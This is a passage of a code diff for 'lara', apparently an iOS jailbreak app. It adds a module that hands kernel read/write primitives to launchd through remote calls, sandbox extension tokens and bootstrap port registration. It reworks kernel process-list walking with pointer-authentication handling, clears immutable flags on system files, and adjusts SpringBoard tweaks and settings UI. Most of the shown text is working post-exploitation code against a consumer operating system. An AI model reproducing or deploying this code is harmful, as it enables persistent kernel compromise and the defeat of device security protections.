+    PERSIST_LOG("remote sandbox_extension_issue_mach lookup end token=0x%llx name=%s\n",
+                (unsigned long long)tokenRemote,
+                name);
+    if (!tokenRemote) {
+        return nil;
+    }
+
+    RemoteArbCallWithTimeout(PERSIST_RC_TIMEOUT, proc, strcpy, mem + 0x200, tokenRemote, 0);
+    NSString *token = proc[mem + 0x200].string;
+    return token.length ? token : nil;
+}
+
+static bool persist_register_bootstrap_port(const char *name, mach_port_t port) {
+    if (!name || port == MACH_PORT_NULL) {
+        return false;
+    }
+
+    kern_return_t kr = bootstrap_register(bootstrap_port, name, port);
+    if (kr == KERN_SUCCESS) {
+        PERSIST_LOG("bootstrap_register ok for %s\n", name);
+        return true;
+    }
+
+    PERSIST_LOG("bootstrap_register failed for %s: %s\n", name, mach_error_string(kr));
+    return false;
+}
+
+static bool transfer_krw_to_launchd_ios16(void) {
+    PERSIST_LOG("transfer begin\n");
+    RemoteCall *proc = [[RemoteCall alloc] initWithProcess:@"launchd" useMigFilterBypass:NO];
+    if (!proc) {
+        NSString *error = [RemoteCall lastInitError];
+        PERSIST_LOG("Failed to create RemoteCall for launchd%s%s\n",
+                    error.length ? ": " : "",
+                    error.length ? error.UTF8String : "");
+        return false;
+    }
+
+    bool ok = false;
+    uint64_t mem = proc.trojanMem;
+    mach_port_t control_socketPort = MACH_PORT_NULL;
+    mach_port_t rw_socketPort = MACH_PORT_NULL;
+    NSString *serviceSuffix = [NSUUID UUID].UUIDString;
+    NSString *controlPortName = [NSString stringWithFormat:@"%s.%@", CONTROL_PORT_NAME, serviceSuffix];
+    NSString *rwPortName = [NSString stringWithFormat:@"%s.%@", RW_PORT_NAME, serviceSuffix];
+    const char *controlName = controlPortName.UTF8String;
+    const char *rwName = rwPortName.UTF8String;
+    NSString *controlToken = nil;
+    NSString *rwToken = nil;
+    NSMutableDictionary *primitive = nil;
+
+    if (!persist_issue_and_consume_mach_extension(proc, mem, APP_MACH_REGISTER, controlName) ||
+        !persist_issue_and_consume_mach_extension(proc, mem, APP_MACH_REGISTER, rwName)) {
+        goto out;
+    }
+
+    fileport_makeport(control_socket, &control_socketPort);
+    fileport_makeport(rw_socket, &rw_socketPort);
+    if (control_socketPort == MACH_PORT_NULL || rw_socketPort == MACH_PORT_NULL) {
+        PERSIST_LOG("fileport_makeport failed control=0x%x rw=0x%x\n", control_socketPort, rw_socketPort);
+        goto out;
+    }
+
+    if (!persist_register_bootstrap_port(controlName, control_socketPort) ||
+        !persist_register_bootstrap_port(rwName, rw_socketPort)) {
+        goto out;
+    }
+
+    controlToken = persist_issue_remote_mach_lookup_token(proc, mem, controlName);
+    rwToken = persist_issue_remote_mach_lookup_token(proc, mem, rwName);
+    if (controlToken.length == 0 || rwToken.length == 0) {
+        goto out;
+    }
+
+    primitive = [NSMutableDictionary dictionary];
+    primitive[@"KernelBase"] = @(kernel_base);
+    primitive[@"KernelSlide"] = @(kernel_slide);
+    primitive[@"LaunchdProcAddr"] = @(procbypid(1));
+    primitive[@"ControlPort"] = controlToken;
+    primitive[@"RWPort"] = rwToken;
+    primitive[@"ControlPortName"] = controlPortName;
+    primitive[@"RWPortName"] = rwPortName;
+
+    NSLog(@"Primitive: %@", primitive);
+    [NSUserDefaults.standardUserDefaults setObject:primitive forKey:@"KRWPrimitive"];
+    [NSUserDefaults.standardUserDefaults synchronize];
+    ok = true;
+
+out:
+    if (!ok) {
+        PERSIST_LOG("failed to transfer KRW primitives to launchd\n");
+    }
+    [proc destroyRemoteCall];
+    return ok;
+}
  ```

  </details>
- 🟡 `lara/kexploit/utils.m` (modified) — +202 / -59
  <details><summary>Diff</summary>

  ```diff
  @@ -14,7 +14,9 @@
 #import <Foundation/Foundation.h>
 #import <mach/mach.h>
 #import <stdio.h>
+#import <stdarg.h>
 #import <unistd.h>
+#import <fcntl.h>
 #import <string.h>
 #import <sys/types.h>
 #import <mach-o/dyld.h>
@@ -74,7 +76,7 @@ void init_offsets(void) {
     int major = 0, minor = 0, patch = 0;
     sscanf(ios, "%d.%d.%d", &major, &minor, &patch);
 
-    if (major > 18 || (major == 18 && minor >= 4)) {
+    if (major >= 16) {
         PROC_PID_OFFSET = 0x60;
     } else {
         PROC_PID_OFFSET = 0x28;
@@ -132,6 +134,7 @@ void init_offsets(void) {
 }
 
 static NSString *const kkernprocoffset = @"lara.kernprocoff";
+static NSString *const kallprocoffset = @"lara.allprocoff";
 
 static inline uint32_t proc_name_offset(void) {
     return off_proc_p_name ? off_proc_p_name : PROC_NAME_OFFSET_FALLBACK;
@@ -152,12 +155,48 @@ static inline uint64_t signptr(uint64_t v) {
 
 #define S(x) ({ uint64_t _v = xpaci(x); signptr(_v); })
 
+static void utils_log_file(const char *fmt, ...) __attribute__((format(printf, 1, 2)));
+static void utils_log_file(const char *fmt, ...) {
+    static int fd = -2;
+    if (fd == -2) {
+        fd = -1;
+        @autoreleasepool {
+            NSArray<NSString *> *dirs = NSSearchPathForDirectoriesInDomains(NSDocumentDirectory, NSUserDomainMask, YES);
+            NSString *docs = dirs.firstObject;
+            if (docs.length != 0) {
+                NSString *path = [docs stringByAppendingPathComponent:@"lara.log"];
+                fd = open(path.fileSystemRepresentation, O_WRONLY | O_CREAT | O_APPEND, 0644);
+            }
+        }
+    }
+    if (fd < 0) return;
+
+    char message[1024];
+    va_list ap;
+    va_start(ap, fmt);
+    vsnprintf(message, sizeof(message), fmt, ap);
+    va_end(ap);
+
+    char line[1150];
+    int len = snprintf(line, sizeof(line), "(utils) %s\n", message);
+    if (len <= 0) return;
+    if (len >= (int)sizeof(line)) len = (int)sizeof(line) - 1;
+    write(fd, line, (size_t)len);
+    fsync(fd);
+}
+
 static uint64_t loadkernproc(void) {
     NSNumber *n = [[NSUserDefaults standardUserDefaults] objectForKey:kkernprocoffset];
     if (!n) return 0;
     return (uint64_t)n.unsignedLongLongValue;
 }
 
+static uint64_t loadallproc(void) {
+    NSNumber *n = [[NSUserDefaults standardUserDefaults] objectForKey:kallprocoffset];
+    if (!n) return 0;
+    return (uint64_t)n.unsignedLongLongValue;
+}
+
 static uint64_t kernprocaddress(void) {
     uint64_t offset = loadkernproc();
     if (offset != 0) {
@@ -168,6 +207,45 @@ static uint64_t kernprocaddress(void) {
     return 0xfffffff0079fd9c8 + kernslide;
 }
 
+static uint64_t allprocaddress(void) {
+    uint64_t offset = loadallproc();
+    if (offset != 0) {
+        return ds_get_kernel_base() + offset;
+    }
+
+    return 0;
+}
+
+static uint64_t kernproc_head(void) {
+    uint64_t kernprocaddr = kernprocaddress();
+    if (!is_kptr(kernprocaddr)) {
+        utils_log_file("kernproc address invalid: 0x%llx", kernprocaddr);
+        return 0;
+    }
+
+    uint64_t kernproc = S(ds_kread64(kernprocaddr));
+    if (!is_kptr(kernproc)) {
+        utils_log_file("kernproc invalid: addr=0x%llx value=0x%llx", kernprocaddr, kernproc);
+        return 0;
+    }
+    return kernproc;
+}
+
+static uint64_t allproc_head(void) {
+    uint64_t allprocaddr = allprocaddress();
+    if (!is_kptr(allprocaddr)) {
+        utils_log_file("allproc address invalid: 0x%llx", allprocaddr);
+        return 0;
+    }
+
+    uint64_t allproc = S(ds_kread64(allprocaddr));
+    if (!is_kptr(allproc)) {
+        utils_log_file("allproc invalid: addr=0x%llx value=0x%llx", allprocaddr, allproc);
+        return 0;
+    }
+    return allproc;
+}
+
 bool islcruntime(void) {
     static int cached_result = -1;
     if (cached_result != -1) {
@@ -234,15 +312,19 @@ static uint64_t checkprocforpid(uint64_t candidate, pid_t pid, const char *src,
 static uint64_t procbysock(void) {
     uint64_t rw_pcb = ds_get_rw_socket_pcb();
     if (!is_kptr(rw_pcb)) {
+        utils_log_file("rw_socket_pcb invalid: 0x%llx", rw_pcb);
         printf("(utils) rw_socket_pcb invalid: 0x%llx\n", rw_pcb);
         return 0;
     }
 
     pid_t ourpid = getpid();
+    utils_log_file("socket fallback: pcb=0x%llx pid=%d", rw_pcb, ourpid);
     printf("(utils) socket fallback: pcb=0x%llx pid=%d\n", rw_pcb, ourpid);
 
     uint8_t pcbbuf[0x200];
+    utils_log_file("socket fallback: reading pcb buffer");
     ds_kread(rw_pcb, pcbbuf, sizeof(pcbbuf));
+    utils_log_file("socket fallback: pcb buffer read");
     for (uint32_t off = 0; off < sizeof(pcbbuf); off += 8) {
         uint64_t candidate = S(*(uint64_t *)(pcbbuf + off));
         uint64_t proc = checkprocforpid(candidate, ourpid, "pcb", off);
@@ -320,13 +402,47 @@ static uint64_t procbysock(void) {
 static uint64_t procbysock_hardcoded(void) {
     uint64_t rw_pcb = ds_get_rw_socket_pcb();
     if (!is_kptr(rw_pcb)) {
+        utils_log_file("socket hardcoded: invalid pcb=0x%llx", rw_pcb);
         printf("(utils) rw_socket_pcb invalid: 0x%llx\n", rw_pcb);
         return 0;
     }
+
+    utils_log_file("socket hardcoded: pcb=0x%llx", rw_pcb);
     uint64_t rwSocketAddr = ds_kread64(rw_pcb + off_inpcb_inp_socket);
+    if (!is_kptr(rwSocketAddr)) {
+        utils_log_file("socket hardcoded: invalid socket=0x%llx", rwSocketAddr);
+        printf("(utils) socket hardcoded: invalid socket=0x%llx\n", rwSocketAddr);
+        return 0;
+    }
+
+    utils_log_file("socket hardcoded: socket=0x%llx", rwSocketAddr);
     uint64_t current_thread = ds_kread64(rwSocketAddr + off_socket_so_background_thread);
+    if (!is_kptr(current_thread)) {
+        utils_log_file("socket hardcoded: invalid thread=0x%llx", current_thread);
+        printf("(utils) socket hardcoded: invalid thread=0x%llx\n", current_thread);
+        return 0;
+    }
+
+    utils_log_file("socket hardcoded: thread=0x%llx", current_thread);
     uint64_t current_thread_ro = thread_get_t_tro(current_thread);
-    return ds_kread64(current_thread_ro + off_thread_ro_tro_proc);
+    if (!is_kptr(current_thread_ro)) {
+        utils_log_file("socket hardcoded: invalid thread_ro=0x%llx", current_thread_ro);
+        printf("(utils) socket hardcoded: invalid thread_ro=0x%llx\n", current_thread_ro);
+        return 0;
+    }
+
+    utils_log_file("socket hardcoded: thread_ro=0x%llx", current_thread_ro);
+    uint64_t proc = ds_kread64(current_thread_ro + off_thread_ro_tro_proc);
+    uint64_t checked_proc = checkprocforpid(proc, getpid(), "thread_ro", off_thread_ro_tro_proc);
+    if (!checked_proc) {
+        utils_log_file("socket hardcoded: proc candidate failed pid check raw=0x%llx", proc);
+        printf("(utils) socket hardcoded: proc candidate failed pid check raw=0x%llx\n", proc);
+        return 0;
+    }
+
+    utils_log_file("found self proc via socket hardcoded -> 0x%llx", checked_proc);
+    printf("(utils) found self proc via socket hardcoded -> 0x%llx\n", checked_proc);
+    return checked_proc;
 }
 
 uint64_t procbypid(pid_t targetpid) {
@@ -335,34 +451,59 @@ uint64_t procbypid(pid_t targetpid) {
         return 0;
     }
 
-    uint64_t proc = proc_self();
-    while (1) {
-        uint32_t curPid = ds_kread32(proc + off_proc_p_pid);
-        if (curPid == targetpid)
-            return proc;
-        proc = ds_kread64(proc + off_proc_p_list_le_next);
-        if(!proc) break;
-    }
-    
-    proc = proc_self();
-    while (1) {
-        uint32_t curPid = ds_kread32(proc + off_proc_p_pid);
-        if (curPid == targetpid)
-            return proc;
-        proc = ds_kread64(proc + off_proc_p_list_le_prev);
-        if(!proc) return 0;    // not found
+    static pid_t cached_self_pid = -1;
+    static uint64_t cached_self_proc = 0;
+    static uint64_t cached_launchd_proc = 0;
+    if (targetpid == 1 && is_kptr(cached_launchd_proc)) {
+        return cached_launchd_proc;
+    }
+    if (targetpid == cached_self_pid && is_kptr(cached_self_proc)) {
+        return cached_self_proc;
+    }
+
+    uint64_t heads[2] = { kernproc_head(), allproc_head() };
+    uint32_t pid_offsets[2] = { off_proc_p_pid, off_proc_p_pid == 0x60 ? 0x28 : 0x60 };
+    for (size_t head_index = 0; head_index < 2; head_index++) {
+        uint64_t proc = heads[head_index];
+        utils_log_file("procbypid start: pid=%d source=%s head=0x%llx",
+                       targetpid, head_index == 0 ? "kernproc" : "allproc", proc);
+        for (int iter = 0; is_kptr(proc) && iter < 4096; iter++) {
+            for (size_t i = 0; i < 2; i++) {
+                uint32_t curPid = ds_kread32(proc + pid_offsets[i]);
+                if (curPid == (uint32_t)targetpid) {
+                    utils_log_file("found proc via %s list -> 0x%llx pid=%d pidoff=0x%x",
+                                   head_index == 0 ? "kernproc" : "allproc",
+                                   proc, targetpid, pid_offsets[i]);
+                    if (targetpid == 1) {
+                        cached_launchd_proc = proc;
+                    } else if (targetpid == getpid()) {
+                        cached_self_pid = targetpid;
+                        cached_self_proc = proc;
+                    }
+                    return proc;
+                }
+            }
+
+            uint64_t raw_next = ds_kread64(proc + off_proc_p_list_le_next);
+            uint64_t next = S(raw_next);
+            if (!is_kptr(next) || next == proc) {
+                break;
+            }
+            proc = next;
+        }
     }
-    
-    return proc;
+
+    utils_log_file("procbypid failed: pid=%d", targetpid);
+    return 0;
 }
 
 uint64_t ourproc(void) {
-    uint64_t proc = procbysock();
+    uint64_t proc = procbysock_hardcoded();
     if (proc != 0) {
         return proc;
     }
 
-    proc = procbysock_hardcoded();
+    proc = procbysock();
     if (proc != 0) {
         return proc;
     }
@@ -372,26 +513,25 @@ uint64_t ourproc(void) {
         return 0;
     }
 
-    char names[3][64] = {{0}};
-    size_t count = procnamecandidates(names, 3);
-    for (size_t i = 0; i < count; i++) {
-        if (names[i][0] == '\0') {
-            continue;
-        }
-
-        printf("(utils) trying procbyname fallback: %s\n", names[i]);
-        proc = procbyname(names[i]);
-        if (proc != 0) {
-            return proc;
-        }
+    proc = procbypid(getpid());
+    if (proc != 0) {
+        return proc;
     }
 
+    utils_log_file("ourproc lookup failed");
+    printf("(utils) ourproc lookup failed\n");
     return 0;
 }
 
 uint64_t taskbyproc(uint64_t procaddr) {
-    uint64_t p_proc_ro = ds_kread64(procaddr + off_proc_p_proc_ro);
-    uint64_t pr_task = ds_kread64(p_proc_ro + off_proc_ro_pr_task);
+    if (!is_kptr(procaddr)) {
+        return 0;
+    }
+    uint64_t p_proc_ro = S(ds_kread64(procaddr + off_proc_p_proc_ro));
+    if (!is_kptr(p_proc_ro)) {
+        return 0;
+    }
+    uint64_t pr_task = S(ds_kread64(p_proc_ro + off_proc_ro_pr_task));
     return pr_task;
 }
 
@@ -418,25 +558,23 @@ uint64_t procbyname(const char *name) {
         return 0;
     }
 
-    uint64_t proc = proc_self();
-    while (1) {
-        char *p_name = proc_get_p_name(proc).data;
-        if(strcmp(p_name, name) == 0)
-            return proc;
-        proc = ds_kread64(proc + off_proc_p_list_le_next);
-        if(!proc) break;
-    }
-    
-    proc = proc_self();
-    while (1) {
-        char *p_name = proc_get_p_name(proc).data;
-        if(strcmp(p_name, name) == 0)
-            return proc;
-        proc = ds_kread64(proc + off_proc_p_list_le_prev);
-        if(!proc) return 0;
+    uint64_t heads[2] = { kernproc_head(), allproc_head() };
+    for (size_t head_index = 0; head_index < 2; head_index++) {
+        uint64_t proc = heads[head_index];
+        for (int iter = 0; is_kptr(proc) && iter < 4096; iter++) {
+            char *p_name = proc_get_p_name(proc).data;
+            if(strcmp(p_name, name) == 0)
+                return proc;
+
+            uint64_t next = S(ds_kread64(proc + off_proc_p_list_le_next));
+            if (!is_kptr(next) || next == proc) {
+                break;
+            }
+            proc = next;
+        }
     }
     
-    return proc;
+    return 0;
 }
 
 proc_entry_t* proclist(const char *search, int *out_count) {
@@ -447,10 +585,12 @@ uint64_t procbyname(const char *name) {
 
     bool list_all = (!search || strlen(search) == 0);
 
-    uint64_t kernprocaddr = kernprocaddress();
-    uint64_t kernproc = ds_kread64(kernprocaddr);
+    uint64_t currentproc = allproc_head();
+    if (!is_kptr(currentproc)) {
+        currentproc = kernproc_head();
+    }
 
-    if (!is_kptr(kernproc)) {
+    if (!is_kptr(currentproc)) {
         *out_count = 0;
         return NULL;
     }
@@ -462,7 +602,6 @@ uint64_t procbyname(const char *name) {
         return NULL;
     }
 
-    uint64_t currentproc = kernproc;
     int iter = 0;
     int matches = 0;
 
@@ -488,7 +627,7 @@ uint64_t procbyname(const char *name) {
             matches++;
         }
 
-        uint64_t next = ds_kread64(currentproc + proc_next_offset());
+        uint64_t next = S(ds_kread64(currentproc + proc_next_offset()));
         if (!is_kptr(next) || next == currentproc) break;
 
         currentproc = next;
@@ -695,7 +834,11 @@ uint64_t proc_self(void) {
 
 uint64_t task_self(void) {
     if (!gSelfTask) {
-        gSelfTask = proc_task(proc_self());
+        uint64_t proc = proc_self();
+        if (!proc) {
+            return 0;
+        }
+        gSelfTask = proc_task(proc);
     }
     return gSelfTask;
 }
  ```

  </details>
- 🟡 `lara/lara-Bridging-Header.h` (modified) — +1 / -0
  <details><summary>Diff</summary>

  ```diff
  @@ -16,6 +16,7 @@
 #import "IconServices.h"
 #import "rc.h"
 #import "RemoteCall.h"
+#import "persistence.h"
 
 #import <zlib.h>
 
  ```

  </details>
- 🟡 `lara/lara.swift` (modified) — +4 / -0
  <details><summary>Diff</summary>

  ```diff
  @@ -133,6 +133,10 @@ struct lara: App {
 
     private func handlebg() {
         guard mgr.rcready else { return }
+        let keepSpringBoardRemoteCallAlive = UserDefaults.standard.bool(forKey: "keepSpringBoardRemoteCallAliveIOS16")
+        if isIOS16() && keepSpringBoardRemoteCallAlive {
+            return
+        }
 
         var bgTask: UIBackgroundTaskIdentifier = .invalid
 
  ```

  </details>
- 🟡 `lara/views/app/ContentView.swift` (modified) — +21 / -10
  <details><summary>Diff</summary>

  ```diff
  @@ -230,17 +230,28 @@ struct ContentView: View {
             } header: {
                 HeaderLabel(text: "RemoteCall", icon: "syringe")
             } footer: {
-                if let error = mgr.rcLastError ?? mgr.sbProc?.lastError {
-                    Text("Error: \(error)")
-                        .foregroundColor(.red)
-                }
-                if RemoteCall.isLiveContainerRuntime() && !RemoteCall.isLiveProcessRuntime() {
-                    Text("RemoteCall needs a PAC-enabled LiveContainer launch context. The main exploit may still work when RemoteCall is unavailable.")
-                }
-                if isdebugged() {
-                    Text("Not available when a debugger is attached.")
+                VStack(alignment: .leading, spacing: 4) {
+                    if let error = mgr.rcLastError ?? mgr.sbProc?.lastError {
+                        Text("Error: \(error)")
+                            .foregroundColor(.red)
+                    }
+                    if RemoteCall.isLiveContainerRuntime() && !RemoteCall.isLiveProcessRuntime() {
+                        Text("RemoteCall needs a PAC-enabled LiveContainer launch context. The main exploit may still work when RemoteCall is unavailable.")
+                    }
+                    if isdebugged() {
+                        Text("Not available when a debugger is attached.")
+                    }
+                    Text("RemoteCall is relatively unstable and may not work properly.")
+                    if isIOS16() {
+                        Text("iOS 16 tip: Open Control Center after tapping Initialize RemoteCall. This significantly improves the success rate and speed.")
+                            .fontWeight(.semibold)
+                            .foregroundColor(.orange)
+                        Text("If initialization fails after about 2 minutes, respring, relaunch Lara, and try again.")
+                            .fontWeight(.semibold)
+                            .foregroundColor(.red)
+                    }
                 }
-                Text("RemoteCall is relatively unstable and may not work properly.")
+                .font(.footnote)
             }
             #endif
         }
  ```

  </details>
- 🟡 `lara/views/app/settings/SettingsView.swift` (modified) — +47 / -0
  <details><summary>Diff</summary>

  ```diff
  @@ -33,11 +33,13 @@ struct SettingsView: View {
     @AppStorage("selectedMethod") private var selectedMethod: method = .hybrid
     @AppStorage("keepAlive") private var keepAlive: Bool = false
     @AppStorage("stashKRW") private var stashKRW: Bool = false
+    @AppStorage("keepSpringBoardRemoteCallAliveIOS16") private var keepSpringBoardRemoteCallAliveIOS16: Bool = false
     
     @State private var dlingkcache: Bool = false
     @State private var showkcacheimport: Bool = false
     @State private var importingkcache: Bool = false
     @State private var showkcachetips: Bool = false
+    @State private var stashingKRWNow: Bool = false
     
     @AppStorage("logsdisplaymode") private var selectedlogdisplaymode: logsdisplaymode = .toolbar
     @AppStorage("loggerNoBS") private var loggerNoBS: Bool = true
@@ -204,6 +206,51 @@ struct SettingsView: View {
                 #if !DISABLE_REMOTECALL
                 Section(header: HeaderLabel(text: "RemoteCall", icon: "syringe")) {
                     Toggle("Stash KRW primitives", isOn: $stashKRW)
+                        .onChange(of: stashKRW) { enabled in
+                            if enabled && isIOS16() {
+                                Alertinator.shared.alert(
+                                    title: "iOS 16 Warning",
+                                    body: "Saving KRW on iOS 16 is currently unstable. If it fails, manually stash KRW a few more times."
+                                )
+                            }
+                        }
+                    if isIOS16() {
+                        Toggle("Keep SpringBoard RemoteCall alive in background", isOn: $keepSpringBoardRemoteCallAliveIOS16)
+                        Text("Warning: If Lara exits while RemoteCall is active, SpringBoard may respring.")
+                            .font(.footnote.weight(.semibold))
+                            .foregroundColor(.red)
+
+                        Button {
+                            guard !stashingKRWNow else { return }
+                            stashingKRWNow = true
+                            mgr.stashKRWToLaunchd { success in
+                                stashingKRWNow = false
+                                if success {
+                                    Alertinator.shared.alert(
+                                        title: "KRW Stashed",
+                                        body: "KRW primitives were successfully stashed to launchd."
+                                    )
+                                } else {
+                                    let error = mgr.rcLastError ?? "Please try manually stashing KRW a few more times."
+                                    Alertinator.shared.alert(
+                                        title: "Failed to Stash KRW",
+                                        body: error
+                                    )
+                                }
+                            }
+                        } label: {
+                            if stashingKRWNow {
+                                HStack {
+                                    Text("Stashing KRW to launchd...")
+                                    Spacer()
+                                    ProgressView()
+                                }
+                            } else {
+                                Text("Stash KRW to launchd now")
+                            }
+                        }
+                        .disabled(!mgr.dsready || mgr.rcrunning || stashingKRWNow)
+                    }
                     Toggle("Allow >10 dock icons", isOn: $rcDockUnlimited)
                 }
                 #endif
  ```

  </details>
- 🟡 `lara/views/fm/DirectoryView.swift` (modified) — +31 / -4
  <details><summary>Diff</summary>

  ```diff
  @@ -166,6 +166,12 @@ struct santanderdirview: View {
                                 Label("Get Info", systemImage: "info.circle")
                             }
 
+                            Button {
+                                share(entry)
+                            } label: {
+                                Label("Share", systemImage: "square.and.arrow.up")
+                            }
+
                             Button {
                                 renameitem = entry
                             } label: {
@@ -355,12 +361,14 @@ struct santanderdirview: View {
         }
         .sheet(item: $chmoditem) { entry in
             santanderchmodsheet(item: entry) { mode in
+                santanderfs.clearImmutableIfPossible(atPath: entry.path)
                 let ok = entry.path.withCString { apfs_mod($0, mode) == 0 }
                 msg = santandermsg(title: "Chmod", text: ok ? "Operation completed." : "Operation failed.")
             }
         }
         .sheet(item: $chownitem) { entry in
             santanderchownsheet(item: entry) { uid, gid in
+                santanderfs.clearImmutableIfPossible(atPath: entry.path)
                 let ok = entry.path.withCString { apfs_own($0, uid, gid) == 0 }
                 msg = santandermsg(title: "Chown", text: ok ? "Operation completed." : "Operation failed.")
             }
@@ -460,6 +468,7 @@ struct santanderdirview: View {
         }
 
         do {
+            santanderfs.clearImmutableIfPossible(atPath: entry.path)
             try FileManager.default.moveItem(atPath: entry.path, toPath: dest)
             model.load(query: query.trimmingCharacters(in: .whitespacesAndNewlines))
         } catch {
@@ -544,7 +553,7 @@ struct santanderdirview: View {
 
         do {
             if replace && FileManager.default.fileExists(atPath: dest) {
-                try FileManager.default.removeItem(atPath: dest)
+                try santanderfs.removeItemClearingImmutable(atPath: dest)
             }
             try FileManager.default.copyItem(atPath: clipitem.path, toPath: dest)
             model.load(query: query.trimmingCharacters(in: .whitespacesAndNewlines))
@@ -578,7 +587,7 @@ struct santanderdirview: View {
 
         do {
             if FileManager.default.fileExists(atPath: entry.path) {
-                try FileManager.default.removeItem(atPath: entry.path)
+                try santanderfs.removeItemClearingImmutable(atPath: entry.path)
             }
             try FileManager.default.copyItem(atPath: clipitem.path, toPath: entry.path)
             model.load(query: query.trimmingCharacters(in: .whitespacesAndNewlines))
@@ -594,13 +603,31 @@ struct santanderdirview: View {
         }
 
         do {
-            try FileManager.default.removeItem(atPath: entry.path)
+            try santanderfs.removeItemClearingImmutable(atPath: entry.path)
             model.load(query: query.trimmingCharacters(in: .whitespacesAndNewlines))
         } catch {
             msg = santandermsg(title: "Delete Failed", text: error.localizedDescription)
         }
     }
 
+    @MainActor
+    private func share(_ entry: santanderitem) {
+        guard readsbx else {
+            msg = santandermsg(title: "Share Unavailable", text: "Share is only supported in SBX mode.")
+            return
+        }
+        guard !entry.isdir else {
+            msg = santandermsg(title: "Share Unavailable", text: "Sharing folders is not supported.")
+            return
+        }
+        guard FileManager.default.isReadableFile(atPath: entry.path) else {
+            msg = santandermsg(title: "Share Failed", text: "File is not readable.")
+            return
+        }
+
+        presentShareSheet(with: URL(fileURLWithPath: entry.path))
+    }
+
     private func upload(_ url: URL) {
         guard readsbx else {
             msg = santandermsg(title: "Upload Unavailable", text: "Upload is only supported in SBX mode.")
@@ -617,7 +644,7 @@ struct santanderdirview: View {
 
         do {
             if FileManager.default.fileExists(atPath: dest) {
-                try FileManager.default.removeItem(atPath: dest)
+                try santanderfs.removeItemClearingImmutable(atPath: dest)
             }
             try FileManager.default.copyItem(at: url, to: URL(fileURLWithPath: dest))
             model.load(query: query.trimmingCharacters(in: .whitespacesAndNewlines))
  ```

  </details>
- 🟡 `lara/views/fm/FileSystemHelpers.swift` (modified) — +17 / -0
  <details><summary>Diff</summary>

  ```diff
  @@ -46,6 +46,22 @@ enum SantanderChown {
 }
 
 enum santanderfs {
+    static func clearImmutableIfPossible(atPath path: String) {
+        guard ProcessInfo.processInfo.operatingSystemVersion.majorVersion == 16 else {
+            return
+        }
+        do {
+            try FileManager.default.setAttributes([.immutable: false], ofItemAtPath: path)
+        } catch {
+            // Some files do not expose the immutable flag to this process; keep the original operation error.
+        }
+    }
+
+    static func removeItemClearingImmutable(atPath path: String) throws {
+        clearImmutableIfPossible(atPath: path)
+        try FileManager.default.removeItem(atPath: path)
+    }
+
     static func listdir(item: santanderitem, readsbx: Bool) -> santanderlisting {
         guard item.isdir else { return santanderlisting(items: [], empty: "Not a directory.") }
 
@@ -288,6 +304,7 @@ enum santanderfs {
         }
         guard readsbx else { return false }
         do {
+            clearImmutableIfPossible(atPath: path)
             try data.write(to: URL(fileURLWithPath: path), options: .atomic)
             return true
         } catch {
  ```

  </details>
- 🟡 `lara/views/tweaks/RemoteView.swift` (modified) — +26 / -5
  <details><summary>Diff</summary>

  ```diff
  @@ -113,7 +113,9 @@ struct RemoteView: View {
                 Button {
                     run("Apply Dock Columns=\(columns)") {
                         let result = set_dock_icon_count(mgr.sbProc, Int32(columns))
-                        return "set_dock_icon_count(\(columns)) -> \(result)"
+                        return result == 0
+                            ? "set_dock_icon_count(\(columns)) -> ok"
+                            : "set_dock_icon_count(\(columns)) -> failed (\(result))"
                     }
                 } label: {
                     Text("Apply Dock Columns")
@@ -124,7 +126,9 @@ struct RemoteView: View {
                 Button {
                     run("Enable Upside Down") {
                         let result = enable_upside_down(mgr.sbProc)
-                        return "enable_upside_down() -> \(result)"
+                        return result == 0
+                            ? "enable_upside_down() -> ok"
+                            : "enable_upside_down() -> failed (\(result))"
                     }
                 } label: {
                     Text("Enable Upside Down")
@@ -135,7 +139,9 @@ struct RemoteView: View {
                 Button {
                     run("Enable Floating Dock") {
                         let result = enable_floating_dock(mgr.sbProc)
-                        return "enable_floating_dock() -> \(result)"
+                        return result == 0
+                            ? "enable_floating_dock() -> ok"
+                            : "enable_floating_dock() -> failed (\(result))"
                     }
                 } label: {
                     Text("Enable Floating Dock")
@@ -144,7 +150,9 @@ struct RemoteView: View {
                 Button {
                     run("Enable Grid App Switcher") {
                         let result = enable_grid_app_switcher(mgr.sbProc)
-                        return "enable_grid_app_switcher() -> \(result)"
+                        return result == 0
+                            ? "enable_grid_app_switcher() -> ok"
+                            : "enable_grid_app_switcher() -> failed (\(result))"
                     }
                 } label: {
                     Text("Enable Grid App Switcher (Broken animation)")
@@ -153,7 +161,9 @@ struct RemoteView: View {
                 Button {
                     run("Enable UIKit Debug Overlay") {
                         let result = enable_debug_overlay(mgr.sbProc)
-                        return "enable_debug_overlay() -> \(result)"
+                        return result == 0
+                            ? "enable_debug_overlay() -> ok"
+                            : "enable_debug_overlay() -> failed (\(result))"
                     }
                 } label: {
                     Text("Enable UIKit Debug Overlay")
@@ -522,11 +532,22 @@ struct RemoteView: View {
             DispatchQueue.main.async {
                 self.mgr.logmsg("(rc) \(result)")
                 onComplete?(result)
+                if self.isRemoteCallFailure(result) {
+                    Alertinator.shared.alert(title: "\(name) Failed", body: result)
+                }
                 self.running = false
             }
         }
     }
 
+    private func isRemoteCallFailure(_ result: String) -> Bool {
+        let lowercased = result.lowercased()
+        return lowercased.contains("-> -1") ||
+            lowercased.contains("-> failed") ||
+            lowercased.contains(": failed") ||
+            lowercased.contains("failed to")
+    }
+
     private func togglefreakydog() {
         guard mgr.rcready, let proc = mgr.sbProc else { return }
 
  ```

  </details>
- 🟡 `lara/views/tweaks/mobilegestalt/GestaltView.swift` (modified) — +26 / -9
  <details><summary>Diff</summary>

  ```diff
  @@ -362,11 +362,11 @@ struct GestaltView: View {
     
     private func loadCurrentGestalt() {
         do {
-            mgCurrentDict = try NSMutableDictionary(contentsOf: URL(fileURLWithPath: mgCurrentPath), error: ())
+            mgCurrentDict = try loadMutablePlistDictionary(from: URL(fileURLWithPath: mgCurrentPath))
             print(mgCurrentDict.description)
             prepareGestaltData()
         } catch {
-            Alertinator.shared.alert(title: "Failed to load current MobileGestalt!", body: "Please restart the app and try again.")
+            Alertinator.shared.alert(title: "Failed to load current MobileGestalt!", body: "\(error)")
         }
     }
     
@@ -381,15 +381,16 @@ struct GestaltView: View {
                 try FileManager.default.copyItem(at: mgCurrentURL, to: mgSavedURL)
             }
             
-            let mgSavedDict = try NSMutableDictionary(contentsOf: mgSavedURL, error: ())
+            let mgSavedDict = try loadMutablePlistDictionary(from: mgSavedURL)
             let cacheExtra = mgSavedDict["CacheExtra"] as? NSMutableDictionary ?? NSMutableDictionary()
             let ArtworkDict = cacheExtra["oPeik/9e8lQWMszEjbPzng"] as? NSMutableDictionary ?? NSMutableDictionary()
             
